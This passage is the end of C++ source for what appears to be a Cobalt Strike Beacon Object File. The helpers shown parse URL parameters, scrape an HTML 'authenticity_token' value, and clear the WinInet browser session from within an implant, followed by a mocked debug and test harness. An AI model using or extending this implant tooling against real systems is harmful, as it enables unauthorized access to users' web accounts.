            BeaconPrintf(CALLBACK_ERROR, "[!] Invalid parameters for retrieveParamValue");
            return NULL;
        }

        size_t paramLen = strlen(param);
        const char* end = data + len;

        for (const char* p = data; p < end - (paramLen + 1); ++p) {
            if ((*p == '?' || *p == '&') &&
                (size_t)(end - p) > paramLen + 1 &&
                strncmp(p + 1, param, paramLen) == 0 &&
                p[1 + paramLen] == '=') {

                const char* valStart = p + 1 + paramLen + 1;
                const char* valEnd = valStart;

                while (valEnd < end && *valEnd != '&' && *valEnd != '#' &&
                    *valEnd != '"' && *valEnd != '\'') {
                    valEnd++;
                }

                size_t vlen = valEnd - valStart;
                char* out = (char*)intAlloc(vlen + 1);
                if (!out) {
                    BeaconPrintf(CALLBACK_ERROR, "[!] Memory allocation failed for parameter value");
                    return NULL;
                }

                memcpy(out, valStart, vlen);
                out[vlen] = '\0';
                return out;
            }
        }

        BeaconPrintf(CALLBACK_ERROR, "[!] Parameter %s not found", param);
        return NULL;
    }
    char* extract_authenticity_token(const char* data, size_t len) {
        const char* end = data + len;
        const char needle[] = "name=\"authenticity_token\"";
        const size_t needle_len = sizeof(needle) - 1;
        const char* p = data;

        while (p + needle_len < end) {
            const char* hit = NULL;
            for (const char* s = p; s + needle_len < end; ++s) {
                if (*s == 'n' && (size_t)(end - s) >= needle_len && memcmp(s, needle, needle_len) == 0) {
                    hit = s;
                    break;
                }
            }
            if (!hit) return NULL;

            const char* tag_end = hit;
            while (tag_end < end && *tag_end != '>') tag_end++;
            if (tag_end >= end) return NULL;

            const char* value_key = "value=";
            const size_t value_key_len = 6;
            const char* value_pos = NULL;

            for (const char* s = hit; s + value_key_len < tag_end; ++s) {
                if ((size_t)(tag_end - s) >= value_key_len && memcmp(s, value_key, value_key_len) == 0) {
                    value_pos = s + value_key_len;
                    break;
                }
            }

            if (!value_pos) {
                const char* tag_start = hit;
                while (tag_start > data && *tag_start != '<') tag_start--;
                if (*tag_start == '<') {
                    for (const char* s = tag_start; s + value_key_len < tag_end; ++s) {
                        if ((size_t)(tag_end - s) >= value_key_len && memcmp(s, value_key, value_key_len) == 0) {
                            value_pos = s + value_key_len;
                            break;
                        }
                    }
                }
            }

            if (!value_pos || value_pos >= tag_end) {
                p = hit + needle_len;
                continue;
            }

            char quote = *value_pos;
            if (quote != '"' && quote != '\'') {
                p = hit + needle_len;
                continue;
            }

            const char* val_start = value_pos + 1;
            const char* val_end = val_start;
            while (val_end < tag_end && *val_end != quote) val_end++;
            if (val_end >= tag_end) return NULL;

            size_t out_len = (size_t)(val_end - val_start);
            char* out = (char*)intAlloc(out_len + 1);
            if (!out) return NULL;

            memcpy(out, val_start, out_len);
            out[out_len] = '\0';
            return out;
        }

        return NULL;
    }
    static void print_last_error(const char* msg) {
        DWORD err = GetLastError();
        BeaconPrintf(CALLBACK_ERROR, "%s (Error: %lu)", msg, err);
    }
    void clear_all_cookies() {
        // This clears ALL cookies and cache for the current process
        if (!InternetSetOption(NULL, INTERNET_OPTION_END_BROWSER_SESSION, NULL, 0)) {
            BeaconPrintf(CALLBACK_ERROR, "[!] Failed to clear session (Error: %lu)", GetLastError());
        }

    }


    LONG PvectoredExceptionHandler(EXCEPTION_POINTERS* ExceptionInfo)
    {
        _endthreadex(ExceptionInfo->ExceptionRecord->ExceptionCode);
        return EXCEPTION_CONTINUE_EXECUTION;
    }


    // ==================== CLEANUP ====================
    void bofstop() {
#ifdef DYNAMIC_LIB_COUNT
        DWORD i;
        for (i = 0; i < loadedLibrariesCount; i++) {
            FreeLibrary(loadedLibraries[i].hMod);
        }
#endif
        return;
    }
}
// ==================== DEBUG/TEST CODE ====================
#if defined(_DEBUG) && !defined(_GTEST)
int main(int argc, char* argv[]) {
    bof::runMocked<>(go, NULL);
    return 0;
}
#elif defined(_GTEST)
#include <gtest\gtest.h>
TEST(BofTest, Test1) {
    std::vector<bof::output::OutputEntry> got = bof::runMocked<>(go);
    // Add your test assertions here
}
#endif